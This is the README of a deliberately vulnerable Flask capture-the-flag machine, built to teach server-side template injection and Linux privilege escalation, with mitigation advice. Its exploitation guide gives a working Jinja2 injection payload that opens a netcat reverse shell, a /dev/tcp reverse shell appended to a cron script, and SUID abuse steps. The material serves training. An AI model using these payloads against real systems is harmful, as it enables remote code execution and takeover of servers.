# THOLVI Web SSTI - Vulnerable CTF Machine

![CTF Difficulty](https://img.shields.io/badge/Difficulty-Easy-green)
![Category](https://img.shields.io/badge/Category-Web%20%2B%20PrivEsc-blue)
![Platform](https://img.shields.io/badge/Platform-Vagrant%2FDocker%2FVirtualBox-orange)

A deliberately vulnerable Flask-based CTF machine designed to teach:
- Server-Side Template Injection (SSTI)
- Linux privilege escalation techniques
- Basic web application security

## Table of Contents
- [Machine Overview](#machine-overview)
- [Quick Start](#quick-start)
- [Detailed Setup](#detailed-setup)
- [Vulnerability Breakdown](#vulnerability-breakdown)
- [Exploitation Guide](#exploitation-guide)
- [Mitigation Strategies](#mitigation-strategies)
- [Flag Locations](#flag-locations)
- [Teaching Resources](#teaching-resources)
- [Contributing](#contributing)

## Machine Overview

**Difficulty Level**: Easy  
**Learning Objectives**:
- Identify and exploit SSTI vulnerabilities
- Gain initial foothold via web exploitation
- Perform Linux privilege escalation
- Understand secure coding practices

**Attack Path**:
1. Web App (Flask SSTI) → 2. Initial Foothold → 3. Privilege Escalation

## Quick Start

### Vagrant (Recommended)
```bash
git clone https://github.com/yourusername/flasky-hack-ctf.git
cd flasky-hack-ctf
vagrant up
vagrant ssh
```
Access the vulnerable app at: http://localhost:5000
### Docker
```
docker build -t flasky-hack .
docker run -p 5000:5000 flasky-hack
```
#### Detailed Setup
#### Requirements

    Vagrant 2.2+

    VirtualBox 6.0+

    OR Docker 19.03+

#### Files Structure
```
/flasky-hack-ctf
├── Vagrantfile
├── setup.sh
├── vuln_app.py
├── Dockerfile
└── README.md
```
Customization

Edit vuln_app.py to modify:

    Flask debug mode (line 10)

    Listening port (line 11)

    Service banners

Vulnerability Breakdown
1. Server-Side Template Injection (SSTI)

Location: /greet endpoint
Vulnerable Code:
```
@app.route("/greet")
def greet():
    name = request.args.get('name', 'Guest')
    return render_template_string(f"Hello, {name}!")  # Vulnerable line
```
Impact: Remote Code Execution (RCE) as Flask user
2. Privilege Escalation Vectors
Vector	Location	Vulnerability Type
SUID Binary	/usr/bin/flask-admin	Misconfigured permissions
Cron Job	/etc/cron.d/backup	Writable script
Exploitation Guide
Step 1: SSTI Detection
```http
http://10.0.0.10:5000/greet?name={{7*7}}
```
Expected output: Hello, 49!
Step 2: Reverse Shell
```python
{{request.application.__globals__.__builtins__.__import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.5 4444 >/tmp/f').read()}}
```
Listener:
```Bash
nc -lvnp 4444
```
Step 3: Privilege Escalation

Method A: SUID Binary
```Bash
find / -perm -4000 2>/dev/null
echo '/bin/bash -p' > /usr/bin/flask-admin
./flask-admin
```
#### Method B: Cron Job
```Bash
echo 'bash -i >& /dev/tcp/10.0.0.5/5555 0>&1' >> /opt/backup.sh
```
### Mitigation Strategies
For SSTI

    Avoid render_template_string() with user input

    Use proper templating:
```Python
return render_template("greet.html", name=name)
```
    Implement input sanitization

For Privilege Escalation

    SUID Binaries:
```Bash
find / -perm -4000 -exec chmod u-s {} \;  # Remove unnecessary SUID bits
```
### Cron Jobs:
```Bash
chown root:root /opt/backup.sh
chmod 700 /opt/backup.sh
```
Flag Locations
Flag	Location	Access Requirements
user.txt	/home/flask/	Initial shell access
root.txt	/root/	Root privileges
Teaching Resources
Suggested Learning Path

    Basic Linux commands

    Web request analysis (Burp Suite/curl)

    Template injection concepts

    Privilege escalation techniques

Monitoring Tools
```Bash
# Flask logs
journalctl -u flask -f

# Authentication logs
tail -f /var/log/auth.log
```
Contributing

Found a bug or have improvements?

    Fork the repository

    Create your feature branch (git checkout -b feature/fooBar)

    Commit your changes (git commit -am 'Add some fooBar')

    Push to the branch (git push origin feature/fooBar)

    Create a new Pull Request

Disclaimer: This machine is for educational purposes only. Use only in controlled environments with proper authorization.
